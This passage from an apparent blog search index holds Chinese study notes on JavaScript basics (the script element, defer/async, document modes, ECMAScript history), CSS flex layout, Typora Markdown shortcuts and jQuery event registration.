console.log(value); //1 2 3 4 5&#125; 3.3.4声明风格及最佳实践 不使用var 限制自己只使用let和const有助于提升代码质量，因为变量有了明确的作用域、声明位置、以及不变的值。 const优先，let次之 使用const声明可以让浏览器运行时强制保持变量不变，也可以让静态代码分析工具提前发现不合法的赋值操作。 只在提前知道未来会有修改时，再改用let. 这样可以让开发者更有信心地推断某些变量的值永远不会变，同时也能迅速发现因意外赋值导致的非预期行为。 3.4 数据类型","categories":[{"name":"readNotes","slug":"readNotes","permalink":"https://shylees.github.io/categories/readNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"红宝书 - 第2章 HTML中的JavaScript","slug":"2.HTML中的JavaScript","date":"2021-01-24T16:00:00.000Z","updated":"2021-01-26T16:00:00.000Z","comments":false,"path":"readNotes/2.HTML中的JavaScript","link":"readNotes/2","permalink":"https://shylees.github.io/readNotes/2.HTML%E4%B8%AD%E7%9A%84JavaScript","excerpt":"","text":"在JavaScript早期，网景公司的工作人员希望在将JavaScript引入HTML页面的同时，不会导致页面在其他浏览器中渲染初问题 最终他们达成了向网页中引入通用脚本能力的共识 当初他们的工作得到了保留，并且最终形成了HTML规范 2.1 &lt;script&gt;元素 将JavaScript插入HTML的主要方法是使用&lt;script&gt;元素。这个元素是由网景公司创造出来，并最早在Netscape Navigator2 中实现的。后来，这个元素被正式加入到HTML规范。 其有以下8个属性： 属性名 状态 作用 使用 async 可选 立即开始下载文件，但不能阻止其他页面动作，比如下载资源或等待其他脚本加载 外部脚本 charset 可选 使用src属性指定的代码字符集 少用，大多浏览器不在乎它的值 crossorigin 可选 配置相关请求的CORS（跨源资源共享）设置，crossorigin=“anonymous”配置文件请求不必设置凭据标志crossorigin=“use-credentials”设置凭据标志，意味着出站请求会包含凭据 默认不使用CORS defer 可选 表示脚本可以延迟到文档完全被解析和显示之后再执行 外部脚本，IE7及更早版本，行内也有效 integrity 可选 允许对比接收到的资源和指定的加密签名以验证子资源完整性（SRI，Subresource Integrity），如果接收到的资源的签名与这个属性指定的签名不匹配，则页面会报错，脚本不会执行。这个属性可以用于确保内容分发网络（CDN，Content Delivery Network）不会提供恶意内容 language 废弃 最初用于表示代码块中的脚本语言（如：”JavaScript“、”JavaScript1.2“，”VBScript“） 大多数浏览器都会忽略这个属性 src 可选 表示包含要执行的代码的外部文件 type 可选 代替language，表示代码块中脚本语言的内容类型（MIME类型） type中：按照惯例，这个值始终都是”text/javascript“，尽管”text/javascript“和”text/ecmascript“都已经废弃了， javascript文件的MIME类型通常是”application/x-javascript“，不过给type这个值有可能导致脚本被忽略。 在非IE浏览器中有效的其他值还有”application/javascript“和”application/javascript“。 如果这个值是module，则代码会被当成es6模块，只有这时候代码中才能出现import和export关键字 使用&lt;script&gt;的方式： 通过它直接在网页中嵌入JavaScript代码 直接把代码放在&lt;script&gt;元素中就行 在&lt;script&gt;元素中的代码被计算完成前，页面的其余内容不会被加载，也不会被显示 注意代码中不能出现&lt;/script&gt;字符串，否则会报错 if要避免上述问题，只需转义字符“\\” 通过它在网页中包含外部JavaScript文件 必须使用src属性 与解释行内一样，解释外部JavaScript文件时，页面会阻塞（阻塞时间包含下载文件的时间） 在XHTML中，可以&lt;script src='excample.js' /&gt;，但其是无效的HTML，有些浏览器不能正常处理 其url指向的资源可以与其HTML页面不在同一个域中 例如&lt;script src='http://www.somewhere.com/afile.js'&gt;&lt;/script&gt; 浏览器在解析这个资源时，会向src属性指定的路径发送一个GET请求，以取得相应资源 这个初始请求不受浏览器同源策略限制 返回并被执行的JavaScript受限制 这个请求仍然受父页面HTTP/HTTPS协议的限制 来自外部域的代码会被当成加载它的页面的一部分来加载和解释 这个能力可以让我们通过不同的域分发JavaScript 若引用了别人服务器上的文件，要确保文件不会被替换 使用了src属性的&lt;script&gt;元素不应该在标签中再包含其他JavaScript代码，否则浏览器只会下载执行脚本文件，从而忽略行内代码 2.1.1 标签位置 放在&lt;head&gt;&lt;/head&gt;标签内（过去） 意味着必须把所有的JavaScript代码都下载、解析和解释完成后，才能开始渲染页面， 若有很多JavaScript文件的页面，会有明显的延迟 &lt;body&gt;元素中的页面内容后面（现代web应用程序） 2.1.2 推迟执行脚本defer HTML4.01定义了defer属性，表示脚本在执行时不会改变页面的结构。即脚本会被延迟到整个页面都解析完毕后再运行 告诉浏览器立即下载，但延迟执行 123456&lt;head&gt; &lt;script defer src=&#x27;example.js&#x27;&gt;&lt;/script&gt; &lt;!-- if XHTML defer=&quot;defer&quot; --&gt;&lt;/head&gt; HTML5规范要求脚本应该按照他们出现的顺序执行，且均会在DOMContentLoaded事件之前执行； 但实际中，推迟执行的脚本不一定总会按照顺序执行或者再DOMContentLoaded事件之前执行； 因此最好只包含一个这样的脚本。 对defer属性的支持时从IE4、Firefox3.5、Safari5和Chrome7开始的。其他浏览器会忽略这个属性，所以还是把要延迟的脚本放在页面底部比较好 2.1.3 异步执行脚本 HTML5定义了async属性，其与defer类似，都只适用于外部脚本，都会告诉浏览器立即开始下载。 但async不能保证他们按照他们出现的次序执行 1234567&lt;head&gt; &lt;script async src=&#x27;example1.js&#x27;&gt;&lt;/script&gt; &lt;script async src=&#x27;example2.js&#x27;&gt;&lt;/script&gt; &lt;!-- if XHTML async=&quot;async&quot; --&gt;&lt;/head&gt; 告诉浏览器，不必等脚本下载和执行完后再加载页面，同样也不必等到该异步脚本下载和执行后再加载其他脚本，所以异步脚本不应该在加载期间修改DOM。 异步脚本保证会在load事件前执行，但可能会在DOMContentLoaded之前/后； 使用其也会告诉页面，你不会使用document.write； Firefox3.6、Safari5和Chrome7支持异步脚本； 2.1.4 动态加载脚本 因为JavaScript可以使用DOM API，所以通过向DOM中动态添加script元素同样可以加载指定的脚本 1234567let script = document.createElement(&#x27;script&#x27;); //创建script.src=&#x27;gibbarish.js&#x27;;//默认以这种方式创建的`script`是异步加载的，相当于添加了async，但可能会有问题//因为所有浏览器支持createElement()方法，但不是所有浏览器都支持async属性//所以为了统一动态脚本的加载行为，可以明确将其设置为同步加载script.async=false;document.head.appendChild(script);//添加到页面上 以这种方式获取的资源对浏览器预加载器是不可见的，会影响它们在资源获取队列中的优先级。根据应用程序的工作方式以及怎么使用，这种方式可能会严重影响性能 要想让预加载器知道这些动态请求文件的存在，可以在文档头部显示声明它们： 1&lt;link rel=&#x27;preload&#x27; href=&#x27;gibberish.js&#x27;&gt; 2.1.5 XHTML中的变化 可扩展性文本标记语言（XHTML，Extensible HyperText Markup Language）是将HTML作为XML的应用重新包装的结果。 在XTML中使用JavaScript必须指定type=text/javascript，HTML则可以没有。 XHTML虽然已经退出历史舞台，但实践中偶尔可能也会遇到遗留代码 在XHTML中编写代码比较严格， 在编写JavaScript时，小于号&lt;会被解释成一个标签的开始，并且由于作为开始标签的小于号后面不能有空格，所以if(a &lt; b)这样的代码会报错；以下是避免这种错误的方法： 把所有小于号&lt;都替换成对应的HTML实体形式&amp;lt;，即if(a &amp;lt; b) 把所有代码都包含到一个CDATA块中 在XHTML/XML中，CDATA块表示文档中可以包含任意文本的区块，其内容不作为标签来解析，因此可以在其中包含任意字符 1234567&lt;script type=&#x27;text/javascript&#x27;&gt;&lt;![CDATA[ function compare(a , b)&#123; if(a &lt; b)&#123; console.log(&quot;a &lt; b&quot;); &#125;... &#125; ]]&gt;&lt;/script&gt; 在兼容XHTML的浏览器中，这样能解决问题，但在不支持CDATA块的非XHTML兼容浏览器中则不行， 所以CDATA比如使用JavaScript注释来抵消： 123456789&lt;script type=&#x27;text/javascript&#x27;&gt; //&lt;![CDATA[ function compare(a , b)&#123; if(a &lt; b)&#123; console.log(&quot;a &lt; b&quot;); &#125;... &#125; //]]&gt;&lt;/script&gt; 这种格式使用于所有现代浏览器，它不仅可以通过XHTML验证，而且对XHTML之前的浏览器也能优雅地降级 2.1.6 废弃的语法 type属性使用一个MIME类型字符串来标识&lt;script&gt;的内容，但MIME类型并没有跨浏览器标准化，即使浏览器默认使用JavaScript，在某些情况下某个无效或无法识别的MIME类型也可能导致浏览器跳过（不执行）相关代码。因此，除非你使用XHTML或&lt;script&gt;标签要求或包含非JavaScript代码，最佳做法式不指定type类型。 在不支持JavaScript的浏览器（特别是Mosaic）中会把&lt;script&gt;元素的内容输出到页面上，解决方案是把脚本代码块包含在一个HTML注释中 12345&lt;script&gt;&lt;!-- function sayHi()&#123; console.log(&quot;Hi!&quot;); &#125;//--&gt;&lt;/script&gt; 使用这种格式，Mosaic等浏览器就可以忽略&lt;script&gt;标签中的内容，而支持JavaScript的浏览器则必须识别这种模式，将其中的内容作为JavaScript来解析。 但其实这种格式以及不再必要，而且不应该使用了。在XHTML模式下，这种格式会导致脚本被忽略，因为代码处于有效的XML注释当中。 2.2 行内代码和外部文件 推荐使用外部文件： 可维护性 缓存 浏览器会根据特定的设置缓存所有外部链接的JavaScript文件 若两个页面引用到同一个文件，则该文件只需下载一次，意味着页面加载更快 适应未来 不必考虑用XHTML或前面提到的注释 外部JavaScript的语法在HTML和XHTML中是一样的 在初次请求时，如果浏览器支持SPDY/HTTP2，就可以从一个地方取得一批文件，并将它们逐个放到浏览器缓存中。通过SPDY/HTTP2获取所有这些独立的资源与获取一个大JavaScript文件的延迟差不多。 在第二个页面请求时，由于已经把应用程序切换成了轻量可缓存的文件，第二个页面也依赖的某些组件此时已经存在浏览器缓存中了。 2.3 文档模式 IE5.5发明了文档模式，即可以使用doctype切换文档； 最初的文档模式有两种：混杂模式和标准模式 这两种模式的区别只体现在通过CSS渲染的内容方面，对JavaScript也有一些关联影响，或称为副作用。 后来又出现了第3种文档模式：准标准模式 这种模式下的浏览器支持很多标准的特性，但是没有标准规定的那么严格； 主要区别在如何对待图片元素周围的空白（在表格中使用图片时最明显） 混杂模式：在所有浏览器中都以省略文档开头的doctype声明作为开关，这种约定不合理，因为混杂模式在不同浏览器中的差异很大，不使用黑科技基本上就没有浏览器一致性可言。 标准模式：通过下列几种文档类型声明开启 &lt;!-- HTML 4.01 Strict --&gt; &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt; 12345* ~~~html &lt;!-- XHTML 1.0 Strict --&gt; &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml-strict.dtd&quot;&gt; &lt;!-- HTML5 --&gt; &lt;!DOCTYPE html&gt; 12345673. **准标准模式**：通过过滤性文档类型（Transitional）和框架集文档类型（Frameset）来触发 * ~~~html &lt;!-- HTML 4.01 Transitional --&gt; &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt; &lt;!-- HTML 4.01 Frameset --&gt; &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Frameset//EN&quot; &quot;http://www.w3.org/TR/html4/frameset.dtd&quot;&gt; 12345* ~~~html &lt;!-- XHTML 4.01 Transitional --&gt; &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml-transitional.dtd&quot;&gt; &lt;!-- XHTML 1.0 Frameset --&gt; &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Frameset//EN&quot; &quot;http://www.w3.org/TR/xhtml1/xhtml1-frameset.dtd&quot;&gt; 准标准模式和标准模式非常接近，很少需要区分，而本书后面所说的标准模式，指的是除混杂模式之外的模式 2.4 &lt;noscript&gt;元素 针对早期浏览器不支持JavaScript的问题，需要一个页面优雅降级的处理方案。 &lt;noscript&gt;元素即用于给不支持JavaScript的浏览器提供替代内容。 虽然先浏览器已经100%支持JavaScript，但对于禁用JavaScript的浏览器来说，这个元素仍然有它的用处 &lt;noscript&gt;元素可以包含任何可以出现在&lt;body&gt;中的html元素（除&lt;script&gt;）; 当满足如下任一条件时，浏览器将显示包含在&lt;noscript&gt;的内容： 浏览器不支持脚本 浏览器对脚本的支持被关闭 2.5 小结 JavaScript是通过&lt;script&gt;元素插入到html页面中的： 要包含外部JavaScript文件，必须将src属性设置为要包含文件的url。文件可以跟网页在同一台服务器上，也可以位于完全不同的域 所有&lt;script&gt;元素会依照它们在网页中出现的次序被解释，在不使用defer和async时，包含在&lt;script&gt;的代码必须严格按次序解释 对不推迟执行的脚本，浏览器必须解释完位于&lt;script&gt;元素的代码，然后才能继续渲染页面的剩余部分。为此，通常把此元素放到页面末尾 可以使用defer属性把脚本推迟到文档渲染完毕后再执行。推迟脚本的原则上按照次序执行 可以使用async属性表示不需要等待其他脚本，同时也不阻塞文档渲染，即异步加载。异步脚本不能保证按照次序执行 通过使用&lt;noscript&gt;元素，可以指定在浏览器不支持脚本时显示的内容。如果浏览器支持，则&lt;noscript&gt;元素中的任何内容都不会被渲染","categories":[{"name":"readNotes","slug":"readNotes","permalink":"https://shylees.github.io/categories/readNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"红宝书 - 第1章 什么是JavaScript","slug":"1.什么是JavaScript","date":"2021-01-23T16:00:00.000Z","updated":"2021-01-24T16:00:00.000Z","comments":false,"path":"readNotes/1.什么是JavaScript","link":"readNotes/1","permalink":"https://shylees.github.io/readNotes/1.%E4%BB%80%E4%B9%88%E6%98%AFJavaScript","excerpt":"","text":"1.1 简短的历史回顾 初想法——1995年，网景公司的Brendan Eich的工程师，开始为即将发布的Netscape Navigator2开发一个叫Mocha(后来改名为LiveScript)的脚本语言，当时计划在客户端和服务器端都使用它，在服务端叫LiveWire. 发布1.0——为赶上发布时间，网景与Sun结为开发联盟，共同完成LiveScript的开发，在Netscape Navigator2正式发布前，网景把LiveScript 改名为JavaScript(搭上媒体当时炒作Java的顺风车) 发布1.1、竞争——JavaScript1.0很成功，网景又在Netscape Navigator3发布了1.1版本，不久后微软发布了IE3，其中包含自己名为JScript的JavaScript实现 意味着出现了两个版本的JavaScript：Netscape Navigator中的JavaScript、IE中的JScript 打造标准-&gt;es——1997年，JavaScript作为提案被提交给欧洲计算机制造商协会(Ecma)。第39技术委员会(TC39)承担了“标准化一门通用、跨平台、厂商中立的脚本语言的语法和语义”的任务(参见TC39-ECMAScript)。 TC39委员会由来自网景、Sun、微软、Borland、Nombas和其他对这门脚本语言有兴趣的公司的工程师组成。 他们花了数月打造出ECMA-262，也就是ECMAScript这个新的脚本语言标准。 使用es标准——1998年，国际标准化组织（ISO）和国际电工委员会（IEC）也将ECMScript采纳为标准（ISO/IEC-16262），自此以后，各家浏览器均以ECMAScript作为自己JavaScript实现的依据，虽然具体实现各有不同。 1.2 JavaScript实现 虽然JavaScript和ECMAScript基本上是同义词，但JavaScript远远不限于ECMA-262所定义的那样 完整的JavaScript实现包括： 核心（ECMAScript） 文档对象模型（DOM） 浏览器对象模型（BOM） 1.2.1 ECMAScript 定义：ECMAScript，即ECMA-262定义的语言，并不局限Web浏览器。 这门语言没有输入输出之类的方法。 ECMA-262将这门语言作为一个基准来定义，以便在它之上再构建更稳健的脚本语言。 Web浏览器只是ECMAScript实现可能存在的一种宿主环境 宿主环境提供ECMAScript的基准实现和与环境自身交互必需的扩展 扩展（比如DOM）使用ECMAScript核心类型和语法，提供特定的于环境的额外功能。 其他宿主环境还有服务器端JavaScript平台Node.js和即将被淘汰的Adobe Flash 不涉及浏览器的话，ECMA-262的定义:(在基本的层面，它描述这门语言的部分：) 语法 类型 语句 关键字 保留字 操作符 全局对象 ECMAScript只是对实现这个规范描述的所有方面的一门语言的称呼。 1.ECMAScript版本 ECMAScript不同的版本以‘edition’表示（也就是描述特定实现的ECMA-262的版本），最近的版本是第10版，发布于2019年06月。 ECMA-262第1版：本质上与网景的JavaScript1.1相同，只不过删除了所有浏览器特定的代码，外加少量细微的修改 ECMA-262要求支持Unicode标准，以支持多语言，而且对象要与平台无关。但Netscape JavaScript1.1的对象不是这样的，比如Date对象就依赖平台。这也是JavaScript1.1和JavaScript1.2不符合ECMA-262第1版的原因 ECMA-262第2版：做了一些编校工作，主要是为了更新之后严格符合ISO/IEC-16262的要求，并没有增减或改变任何特性 ECMAScript实现通常不使用第2版来衡量符合性 ECMA-262第3版：第一次真正对这个标准进行更新，更新了字符串处理、错误定义和数值输出，还增加了对正则表达式、新的控制语句、try/catch异常处理的支持，以及为了更好地让国际化所做的少量修改 ECMA-262第4版：是对这门语言的一次彻底修订。Ecma39再次被召集起来，几乎在第3版的基础上完全定义了一门新语言。包括强类型变量、新语句、数据结构、真正的类、经典的继承、操作数据的新手段。因为跳跃太大，所以在正式发布前就被放弃了 ECMA-262第5版：Ecma39在研究第4版的同时也提出了‘ECMAScript3.1’，只对这门语言进行较少的改进，只要在现有JavaScript引擎基础上做一些增改就可以实现，最终ES3.1变成了ECMA-262的第5版，其致力于厘清第3版存在的歧义，也增加了新功能。包括原生的解析和序列化JOSN数据的json对象、方便继承和高级属性定义的方法、新的增强ECMAScript引擎解释和执行代码能力的严格模式 ECMA-262第6版：ES6、ES2015、ES Harmony（和谐版），于2015年6月发布。这一版包含了大概这个规范有史以来最重要的一批增强特性。ES6正式支持了类、模块、迭代器、生成器、箭头函数、期约、反射、代理和众多新的数据类型。 ECMA-262第7版：ES7、ES2016，于2016年6月发布，这次修订只包含少量语法层面的增强，如Array.proptotype.includes和**指数操作符****. ECMA-262第8版：ES8、ES2017，完成于2017年6月，这一版主要增加了异步函数(async/await)、SharedArrayBuffer及Atomics API，以及Object.values() / Object.entries() / Object.getOwnPropertyDescriptors() 和字符串填充方法，另外明确支持对象字面量最后的逗号。 ECMA-262第9版：ES9、ES2018，发布于2018年6月，这次修订包括异步迭代、剩余和扩展属性、一组新的正则表达式特性、Promise finally()，以及模板字面量修改。 ECMA-262第10版：ES10、ES2019，发布于2019年6月，这次修订增加了Array.prototype.flat() / flatMap() 、 String.prototype.trimStart() / trimEnd() 、Object.fromEntries() 方法，以及Symbol.prototype.description属性，明确定义了Function.prototype.toString() 的返回值值并固定了Array.prototype.sort() 的顺序。解决了JSON字符串兼容的问题，并定义了catch子句的可选绑定。 2.ECMAScript符合性是什么意思 ECMA-262阐述了什么是ECMAScript符合性，要成为ECMAScript实现，必须满足： 支持ECMA-262中描述的所有“类型、值、对象、属性、函数，以及程序语法与语义”； 支持Unicode字符标准 此外，符合性实现还可以满足下列要求： 增加ECMA-262中未提及的“额外的类型、值、对象、属性和函数”。ECMA-262所说的这些额外内容主要指规范中未给出的新对象或对象的新属性 支持ECMA-262中，没有定义的“程序和正则表达式语法”(允许修改和扩展内置的正则表达式特性) 3. 浏览器对ECMAScript的支持 浏览器 ECMAScript符合性 Netscape Navigator2 — Netscape Navigator3 — Netscape Navigator4~4.05 — Netscape Navigator4.06~4.79 第1版 Netscape 6+（Mozilla 0.6.0+） 第3版 IE3~4 — IE5 第1版 IE5.5~8 第3版 IE9 第5版（部分） IE10~11 第5版 Edge12+ 第6版 Opera6~7.1 2 Opera7.2+ 3 Opera15~28 5 Opera29~35 6（部分） Opera36+ 6 Safari1~2.0.x 第3版（部分） Safari3.1~5.1 第5版（部分） Safari6~8 第5版 Safari9+ 第6版 iOS Safari3.2~5.1 5（部分） iOS Safari6~8.4 5 iOS Safari9.2+ 6 Chrome1~3 第3版 Chrome4~22 第5版（部分） Chrome23+ 第5版 Chrome42~48 第6版（部分） Chrome79+ 第6版 Firefox1~2 3 Firefox3.0.x~20 5（部分） Firefox21~44 5 Firefox45+ 6 1.2.2 DOM 文档对象模型（DOM，Document Object Model）是一个应用程序接口（API），用于在HTML中使用扩展的XML。DOM将整个页面抽象为一组分层节点。HTML或XML页面的每个组成部分都是一种节点，包含不同的数据。 DOM通过创建表示文档的树，让开发者可以随心所欲地控制网页的内容和结构。使用DOM API，可以轻松的删除、添加、替换、修改节点。 1.为什么DOM是必需的 在IE4和Netscape Navigator4支持不同形式的动态HTML（DHTML）的情况下，开发者首先可以做到不刷新页面而修改页面外观和内容。为了保持Web跨平台性，万维网联盟（W3C，World Wide Web Consortium）开始制定DOM标准的进程。 2.DOM级别 1998年10月，DOM Level 1 成为W3C的推荐标准。由以下两个模块组成： DOM Core ： 映射XML文档，从而方便访问和操作文档任意部分的方式 DOM HTML ：扩展了Core，并增加了特定于HTML的对象和方法 DOM Level 1 的目标是映射文档结构，而DOM Level 2的目标则宽泛得多。对最初DOM的扩展增加了对（DHTML早就支持的）鼠标和用户界面事件、范围、遍历的支持，而且通过对象接口支持了层叠样式表CSS。DOM Level 1 中的DOM Core也被扩展以包含对XML命名空间的支持。 ​ DOM Level 2新增了以下模块，以支持新的接口 DOM视图：描述追踪文档不同视图（如应用CSS样式前后的文档）的接口 DOM事件：描述事件及事件处理接口 DOM样式：描述处理元素CSS样式的接口 DOM遍历和范围：描述遍历和操作DOM树的接口 DOM Level 3进一步扩展了DOM，增加了以统一的方式加载和保存文档的方法（包含在一个叫DOM Load and Save的新模块中），还有验证文档的方法（DOM Validation）。在Level3中，DOM Core经过扩展支持了所有XML1.0的特性，包括XML Infoset、XPath 和 XML Base 目前，W3C不再按照Level来维护DOM了，而是作为DOM Living Standard来维护，其快照称为DOM4，DOM4新增的内容包括替代Mutation Events的Mutation Observers 3.其他DOM 除了DOM Core和DOM HTML接口，有些其他语言也发布了自己的DOM标准。 以下语言均基于XML，每一种都增加了该语言独有的DOM方法和接口： W3C推荐标准： 可伸缩矢量图（SVG，Scalable Vector Graphics） 数学标记语言（MathML，Mathematical Markup Language） 同步多媒体集成语言（SMIL，Synchronization Multimedia Integration Language） 非W3C推荐的标准： Mozilla的XML用户界面语言（XUL，XML User Interface Language） ４.Web浏览器对DOM的支持情况 浏览器 DOM兼容 Netscape Navigator１～４.ｘ — Netscape 6+（Mozilla 0.6.0+） Level１、Level２（几乎全部）、Level３（部分） IE２～4.ｘ — IE5 Level１（很少） IE5.5~8 Level１（几乎全部） IE９＋ Level１、Level２、Level３ Edge Level１、Level２、Level３ Opera１～６ — Opera7～８.ｘ Level１（几乎全部）、Level２（部分） Opera９～９.９ Level１、Level２（几乎全部）、Level３（部分） Opera１０＋ Level１、Level２、Level３（部分） Safari１.０.ｘ Level１ Safari２＋ Level１、Level２（全部）、Level３（部分） iOS Safari3.２＋ Level１、Level２（全部）、Level３（部分） Chrome1＋ Level１、Level２（全部）、Level３（部分） Firefox1＋ Level１、Level２（几乎全部）、Level３（部分） 1.2.3 BOM 浏览器对象模型（BOM）API，用于支持访问和操作浏览器的窗口。 它是唯一一个没有相关标准的JavaScript实现。后来html5以正式规范的形式涵盖了尽可能多的DOM特性 BOM主要针对浏览器窗口和子窗口（frame），通常人们会把任何特定于浏览器的扩展都归在BOM的范畴内，下面就是这样一些扩展： 弹出新浏览器窗口的能力 移动、缩放和关闭浏览器窗口的能力 navigator对象，提供关于浏览器的详尽信息 location对象，提供浏览器加载页面的详尽信息 screen对象，提供关于用户屏幕分辨率的详尽信息 performance对象，提供浏览器内存占用，导航行为和事件统计的详尽信息 对cookie的支持 其他自定义对象，如XMLHttpRequest和IE的ActiveXObject 1.3 JavaScript版本 浏览器 JavaScript版本 Netscape Navigator2 1.0 Netscape Navigator3 1.1 Netscape Navigator4 1.2 Netscape Navigator4.06 1.3 Navigator6+（Mozilla0.6.0+） 1.5 Firefox1 1.5 Firefox1.5 1.6 Firefox2 1.7 Firefox3 1.8 Firefox3.5 1.8.1 Firefox3.6 1.8.2 Firefox4 1.8.5 Netscape/Mozilla仍然沿用这种版本方案，而IE的JScript有不同的版本号规则 多数浏览器对JavaScript的支持，指的是实现ECMAScript和DOM的程度 1.4 小结 JavaScript是一门用来于网页交互的脚本语言，包含以下三个组成部分： ECMAScript DOM BOM JavaScript的这三个部分得到了五大web浏览器（IE、Firefox、Chrome、Safari和Opera）不同程度的支持； 所有浏览器基本上对ES5提供了完善的支持，对ES6和ES7的支持度也在不断提升； 这些浏览器对DOM的支持各不相同，但对Level3的支持日益趋于规范； HTML5中收录的BOM会因浏览器而异，不过开发者可以假定存在很大一部分公共特性","categories":[{"name":"readNotes","slug":"readNotes","permalink":"https://shylees.github.io/categories/readNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"flex 布局","slug":"further/flex","date":"2020-11-06T16:00:00.000Z","updated":"2020-11-06T16:00:00.000Z","comments":false,"path":"learningNotes/further/flex","link":"learningNotes/further/flex","permalink":"https://shylees.github.io/learningNotes/further/flex","excerpt":"","text":"flex 布局是什么 Flex 是 Flexible Box 的缩写，意为&quot;弹性布局&quot;，用来为盒状模型提供最大的灵活性。 任何一个容器都可以指定为 Flex 布局。display: flex; 行内元素也可以使用 Flex 布局。display: inline-flex; Webkit 内核的浏览器，必须加上-webkit前缀。display: -webkit-flex; display: flex; 注：设为 Flex 布局以后，子元素的float、clear和vertical-align属性将失效。 ​ 基本概念 采用 Flex 布局的元素，称为 Flex 容器（flex container），简称&quot;容器&quot;。它的所有子元素自动成为容器成员，称为 Flex 项目（flex item），简称&quot;项目&quot;。 容器的属性 flex-direction：决定主轴的方向（即项目的排列方向） row 默 | row-reverse | column | column-reverse; flex-wrap：定义,一条轴线排不下，如何换行 nowrap 默 | wrap | wrap-reverse; flex-flow：是flex-direction属性和flex-wrap属性的简写形式 justify-content：定义了项目在主轴上的对齐方式 flex-start 默 | flex-end | center | space-between | space-around; align-items：定义项目在交叉轴上如何对齐 flex-start | flex-end | center | baseline | stretch 默 align-content：定义了多根轴线的对齐方式，如果项目只有一根轴线，不起作用 flex-start | flex-end | center | space-between | space-around | stretch 默 项目的属性 order：定义项目的排列顺序。数值越小，排列越靠前，默认为0 flex-grow：项目的放大比例，默认为0，即如果存在剩余空间，也不放大 flex-shrink：性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小 flex-basis：在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。 &lt;length&gt; | auto flex：flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选 align-self：允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性 auto | flex-start | flex-end | center | baseline | stretch","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"css","slug":"css","permalink":"https://shylees.github.io/tags/css/"}]},{"title":"markdown语法/typora使用及其快捷键","slug":"typora使用快捷键","date":"2020-11-01T16:00:00.000Z","updated":"2020-11-01T16:00:00.000Z","comments":false,"path":"learningNotes/typora使用快捷键","link":"learningNotes/typora使用快捷键","permalink":"https://shylees.github.io/learningNotes/typora%E4%BD%BF%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE","excerpt":"","text":"超详细：https://blog.csdn.net/SIMBA1949/article/details/79001226 标题 ’#‘ 一阶标题 ctrl+1 ‘##’ 二阶标题 ctrl+2 … ‘######’ 六阶标题 ctrl+6 文本居中 '&lt;center&gt;这是要居中的文本&lt;center&gt;’ 居中 这是要居中的文本 下划线 或者ctrl+u 删除线 或者alt+shift+5 字体加粗 或者ctrl+B 或者一对__ l 字体倾斜 或者ctrl+i 或者 一对_ l 字体倾斜加粗 或者用一对___ l 图片插入 可直接拉入 或者 超链接 http://www.simba.com //&lt;直接输入&gt; 百度百科 //快捷健 ctrl+k or /[自定义内容 /]/(超链接地址) 打开本地文件时 1[打开linkTest.md文档](./linkTest.md) 页内跳转 1[链接文字](#标题文字) [标题](# 标题) 代码行 一对`包住 printf(&quot;hello&quot;) 代码段 三个`+enter /空格 +编程语言 1System.out.printf(&quot;hello&quot;); 表格使用 ctrl+t 会自动跳出设置行和列的设置框 使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行 or |国际|省市|市区| 国际 省市 市区 任务列表 -/+/*无序列表 java -[] 多选框（注意用空格隔开） java 任意数字+.+空格 有序列表 数学表达式 行内：由一个美元符号将公式包起来 $cosx+sinx=1$ 行外：ctrl+shift+m $$ cosx+sinx=1 $$ 上标下标 可以使用^,_后跟相应符号实现 $a^1$ $a_1$ $a^{32}$ 根号 可以用\\sqrt{} \\sqrt[]{} $\\sqrt{5}$ $\\sqrt[4]{10}$ 上下水平线 \\underline{} \\overline $\\underline{a+1}$ $\\overline{a+1}$ 更多数学公式在：https://blog.csdn.net/SIMBA1949/article/details/79001226 水平分割线 ***或 - - -（不行） 引用 ‘&gt;’+空格 引用 注释 [^ 注释内容] 插入目录 可以在输入[toc]命令的地方自动根据标签生成目录 导出 选择文件–&gt;导出 文本高亮 一对== ==高亮== 表情 :单词 :dancer: typora与html 改变文字颜色 用font标签改变大小及颜色 字体为red ，大小为2 改变对齐方式 左对齐 中间对齐 右对齐 插入图像 通过","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[]},{"title":"03 jQuery事件","slug":"jquery/03jQuery事件","date":"2020-09-21T16:00:00.000Z","updated":"2020-09-25T16:00:00.000Z","comments":false,"path":"learningNotes/jquery/03jQuery事件","link":"learningNotes/jquery/03jQuery事件","permalink":"https://shylees.github.io/learningNotes/jquery/03jQuery%E4%BA%8B%E4%BB%B6","excerpt":"","text":"1.jQuery事件注册 单个注册事件 语法： 123element.事件(function()&#123;&#125;)$(&quot;div&quot;).click(function()&#123; 事件处理程序 &#125;) 其他事件跟原生基本一致 比如：mouseover、mouseout、blur、focus、change、keydown、keyup、resize、scroll等 123456789$(function()&#123; //1.单个事件注册 $(&quot;div&quot;).click(function()&#123; $(this).css(&quot;background&quot;,&quot;purple&quot;); &#125;); $(&quot;div&quot;).mouseenter(function()&#123; 